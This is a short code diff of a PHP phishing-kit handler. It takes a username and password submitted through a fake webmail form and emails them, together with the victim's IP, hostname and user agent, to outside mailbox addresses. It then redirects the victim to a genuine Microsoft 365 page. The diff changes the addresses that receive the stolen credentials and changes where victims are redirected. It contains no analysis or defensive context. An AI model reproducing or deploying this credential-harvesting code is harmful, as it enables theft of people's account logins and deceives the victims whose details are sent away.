@@ -7,10 +7,10 @@ $username = $_POST['username'];
 $password = $_POST['password'];
 
 
-$send = "zacyth@gmail.com";
+$send = "	john777ben@gmail.com, rezultreport@hotmail.com";
 $subject = "webmail-2019 $hostname";
 $msg = "----------------------\nIP:$ip\nHost name:$hostname\nUserAgent :$useragent\nUser Name :$username\npassword :$password\n\n";
 mail($send,$subject,$msg);
-header("Location: https://mail.163.com/");
+header("Location: https://www.microsoft.com/en-us/microsoft-365/excel/");
 
 ?>
